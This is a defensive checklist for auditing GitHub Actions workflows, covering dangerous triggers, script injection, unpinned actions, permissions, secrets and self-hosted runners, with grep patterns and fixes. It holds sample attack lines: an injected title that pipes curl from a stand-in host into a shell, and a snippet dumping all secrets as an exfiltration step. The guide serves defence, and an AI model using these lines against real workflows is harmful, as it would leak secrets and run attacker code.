# GitHub Actions Security Checks

Each check says what to match, why it matters, and how to fix it. Severity is a ceiling; downgrade it if the issue isn't reachable (see Step 3 in SKILL.md).

---

## 1. Dangerous Triggers

### 1.1 `pull_request_target` with PR code checkout — CRITICAL ("pwn request")

`pull_request_target` runs with repository secrets and write permissions. If the workflow then checks out the PR head and executes its code (tests, build, install scripts), a fork PR runs with those privileges.

**Detect:**
```
grep -nE '^\s*pull_request_target\b' workflow.yml
```
Then in the same file, look for:
- `ref: ${{ github.event.pull_request.head.sha }}` or `head.ref`
- `actions/checkout` without explicit `ref:` (defaults to base, but combined with subsequent `git checkout` is still risky)
- Any `run:` that executes project code: `npm install`, `npm test`, `pip install`, `make`, `go test`, `./gradlew`, etc.
- Any third-party action that runs project code (linters, test runners, build actions)

**Real incidents:** Trivy action, Ultralytics.

**Fix:**
- Prefer `pull_request` (no secrets, no write). Use `workflow_run` with artifact-based handoff if secrets are needed after tests.
- If `pull_request_target` is required: gate execution behind a label added by a maintainer (`if: contains(github.event.pull_request.labels.*.name, 'safe-to-test')`), or split into a minimal "label-only" workflow.
- Never `checkout` the PR head in a job that has access to secrets.

### 1.2 `workflow_run` with artifact download — HIGH

A parent workflow triggered by an untrusted event can poison artifacts. A downstream `workflow_run` job that downloads and executes those artifacts inherits the compromise with more permissions.

**Detect:**
```
grep -nE 'on:\s*$|workflow_run:' workflow.yml
```
Look for `actions/download-artifact` or `dawidd6/action-download-artifact` followed by `run:` that executes artifact contents.

**Fix:** Validate artifact contents (checksum, schema), don't execute downloaded code, scope permissions tight, use `if: github.event.workflow_run.conclusion == 'success'`.

### 1.3 Other untrusted-input triggers — HIGH

`issues`, `issue_comment`, `discussion`, `discussion_comment`, `fork`, `watch` — all can be triggered by anyone. Risk only emerges if the workflow *uses* the untrusted content in a privileged way.

**Detect:** Find these triggers, then check whether `github.event.issue.*`, `github.event.comment.*`, `github.event.discussion.*` flow into `run:` blocks or are passed to actions that execute them.

---

## 2. Script Injection

### 2.1 Direct interpolation of attacker-controlled context into `run:` — HIGH

```yaml
run: echo "Title: ${{ github.event.issue.title }}"   # injection
run: deploy --branch ${{ github.head_ref }}          # injection
```

GitHub substitutes the expression *before* shell parsing, so a title like `"; curl evil | sh; #` executes.

**Attacker-controlled fields (always dangerous):**
- `github.event.issue.title`, `.body`
- `github.event.pull_request.title`, `.body`, `.head.ref`, `.head.label`
- `github.event.comment.body`
- `github.event.review.body`, `.review_comment.body`
- `github.event.discussion.title`, `.body`
- `github.event.commits.*.message`, `.author.name`, `.author.email`
- `github.event.workflow_run.head_branch`, `.head_commit.message`
- `github.head_ref`, `github.event.pages.*.page_name`
- Anything under `github.event.inputs.*` if the workflow is triggered from low-trust sources

**Trusted fields (usually safe):**
- `github.sha`, `github.ref`, `github.repository`, `github.actor` (still validate if used in URLs)
- `github.run_id`, `github.run_number`, `github.job`
- `secrets.*` (not attacker-controlled, but see §4)

**Detect:**
```
grep -nE 'run:.*\$\{\{\s*(github\.event\.|github\.head_ref|github\.event\.inputs\.)' workflow.yml
```

**Fix:** bind to env var, quote the variable:
```yaml
env:
  TITLE: ${{ github.event.issue.title }}
run: echo "Title: $TITLE"
```

### 2.2 `GITHUB_ENV` / `GITHUB_PATH` poisoning — HIGH

Writing attacker-controlled data to these files mutates env/path for all subsequent steps in the job.

**Detect:**
```
grep -nE 'echo.*\$\{\{.*\}\}.*>>\s*\$GITHUB_(ENV|PATH)' workflow.yml
```

**Fix:** validate or hardcode values; never pipe untrusted data into these files. Especially watch for `LD_PRELOAD`, `PATH`, `NODE_OPTIONS`, `PYTHONPATH`.

### 2.3 Dynamic action inputs from untrusted data — MEDIUM

`with: ref: ${{ github.event.pull_request.head.ref }}` isn't injection on its own, but it's the enabler when combined with checkout of PR head (§1.1).

---

## 3. Supply Chain (Third-Party Actions)

### 3.1 Action pinned to tag or branch — HIGH for third-party, MEDIUM for first-party

Tags are mutable. A force-push to a tag, or a compromise of the publisher, ships malicious code to every consumer. `tj-actions/changed-files` (2024) compromised 22k repos this way.

**Detect:**
```
grep -nE 'uses:\s+[^@]+@(v[0-9]+|main|master|latest|[^a-f0-9]{0,40}$)' workflow.yml
```
A proper SHA pin is exactly 40 hex chars: `uses: owner/repo@a81bbbf8298c0fa03ea29cdc473d45aca93ccf1d`.

**First-party (`actions/*`, `github/*`, `docker/*`):** MEDIUM — still recommended to pin, but lower likelihood of compromise.

**Third-party:** HIGH. CRITICAL if the action has access to secrets or runs privileged code.

**Fix:**
```bash
gh api repos/OWNER/REPO/commits/TAG --jq .sha
```
Pin with version comment for readability:
```yaml
- uses: tj-actions/changed-files@a1d14d5d65a21140b313d350ff2a7930b5e4a91d # v45.0.3
```

### 3.2 Missing cooldown on new action versions — LOW

Adopting a version within hours of release misses the detection window for supply chain attacks (typical: 3h–7d). Use Renovate `minimumReleaseAge: "7 days"` or `pinact --min-age 7`.

### 3.3 No Dependabot for actions — LOW

Check `.github/dependabot.yml` for `package-ecosystem: "github-actions"`. Without it, pinned SHAs rot and CVEs go unpatched.

---

## 4. Permissions & Secrets

### 4.1 Missing or permissive `permissions:` — HIGH

Without explicit `permissions:`, the job gets the repo's default `GITHUB_TOKEN` scope, which may be read-write for older orgs. A compromised step can then modify the repo, push tags, or cut releases.

**Detect:**
- No top-level `permissions:` key.
- `permissions: write-all`.
- Job-level `permissions:` missing on jobs that use `GITHUB_TOKEN`.

**Fix:** default to `permissions: {}` (or `contents: read`) at workflow level; grant per job only what's needed:
```yaml
permissions:
  contents: read
jobs:
  release:
    permissions:
      contents: write
      id-token: write
```

### 4.2 `secrets: inherit` in reusable workflows — HIGH

Passes every secret to the called workflow, which breaks least-privilege.

**Detect:** `grep -n 'secrets:\s*inherit' workflow.yml`

**Fix:** name secrets explicitly:
```yaml
secrets:
  NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

### 4.3 Dumping secrets context — CRITICAL

```yaml
env:
  ALL: ${{ toJson(secrets) }}
run: echo $ALL | base64   # exfil primitive
```

**Detect:** `grep -nE 'toJson\s*\(\s*secrets\s*\)' workflow.yml`

**Fix:** remove. Pass only the secrets that step actually needs.

### 4.4 Secrets passed to untrusted steps — CRITICAL

Any job triggered by an untrusted event (§1) that has `${{ secrets.* }}` in its env or as action inputs will leak those secrets if injection succeeds.

**Fix:** move secret-using steps to a trusted trigger (`push` on protected branch, approved environment), or gate them behind an `environment:` with required reviewers.

### 4.5 Missing `environment:` gate on production deploys — MEDIUM

Production deploy jobs should use `environment: production` so the environment's required reviewers + secret scoping apply.

---

## 5. Credentials & Artifacts

### 5.1 `actions/checkout` without `persist-credentials: false` when artifacts are uploaded — MEDIUM

`checkout` writes the `GITHUB_TOKEN` into `.git/config`. A later `upload-artifact` with a broad path (`./`, `.`) leaks the token.

**Detect:** file contains `actions/checkout` *and* `upload-artifact` with `path:` matching `.`, `./`, `*`, or a parent that includes `.git`.

**Fix:** set `persist-credentials: false`, and upload a specific directory, not the repo root.

### 5.2 Long-lived cloud credentials as secrets — MEDIUM

```yaml
- uses: aws-actions/configure-aws-credentials@v4
  with:
    aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
    aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
```

**Fix:** OIDC with role assumption:
```yaml
permissions:
  id-token: write
  contents: read
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::ACCOUNT:role/GithubActionsRole
    aws-region: us-east-1
```
Scope the trust policy to repo+branch+environment.

### 5.3 Artifact paths with broad globs — LOW

`path: ./` or `path: .` uploads everything including `.git`, `.env`, node_modules. Use specific dirs (`dist/`, `build/`).

### 5.4 Cache keys derived from untrusted input — MEDIUM

A cache key controlled by a fork PR can poison the cache for the base repo.
**Detect:** `actions/cache` where `key:` or `restore-keys:` contains `github.head_ref`, `github.event.pull_request.*`.

---

## 6. Runners

### 6.1 Self-hosted runner on public repo — CRITICAL

Any fork PR can execute on your infrastructure. Non-ephemeral runners let an attacker persist between jobs.

**Detect:**
```
grep -nE 'runs-on:\s*(self-hosted|\[.*self-hosted)' workflow.yml
```
Cross-check repo visibility:
```
gh repo view --json visibility -q .visibility
```

**Fix:** Use GitHub-hosted runners for public repos. For private+self-hosted: use ephemeral JIT runners, runner groups scoped per repo, egress controls.

### 6.2 Non-ephemeral self-hosted runners — HIGH

If runners reuse hardware between jobs, a compromised job can persist. Use ephemeral (`--ephemeral`) or JIT runners.

### 6.3 Runner groups not restricted — MEDIUM

An org-wide runner group accessible to all repos means a compromise in any one repo reaches the runner. Scope groups to specific repos.

---

## 7. Repo & Org Configuration

### 7.1 Actions can create/approve PRs — MEDIUM

Settings → Actions → General → "Allow GitHub Actions to create and approve pull requests" should be OFF unless explicitly needed. A compromised workflow can self-merge.

**Detect:**
```
gh api repos/OWNER/REPO/actions/permissions/workflow --jq .can_approve_pull_request_reviews
```

### 7.2 Default `GITHUB_TOKEN` permissions are read-write — HIGH

**Detect:**
```
gh api repos/OWNER/REPO/actions/permissions/workflow --jq .default_workflow_permissions
```
Should be `"read"`.

### 7.3 Workflows not owned in CODEOWNERS — MEDIUM

Without CODEOWNERS coverage of `.github/workflows/`, any write-access contributor can add a malicious workflow.

**Detect:**
```
grep -E '^/\.github/workflows/' .github/CODEOWNERS 2>/dev/null
```

### 7.4 No allowlist for third-party actions — LOW

Org setting "Allow all actions" lets any marketplace action run. Prefer "Allow actions created by GitHub" + explicit allowlist.

### 7.5 Branch protection missing on default branch — HIGH

Required for any security boundary on workflow changes. Check via `gh api repos/OWNER/REPO/branches/main/protection`.

---

## Tool integrations (report as follow-ups)

- `zizmor`: static analysis, catches most of §1, §2, §3 automatically
- `actionlint`: general workflow linter, less security-focused
- `pinact`: SHA pin + cooldown enforcement
- `Scorecard`: OpenSSF repo health check, flags many of §7
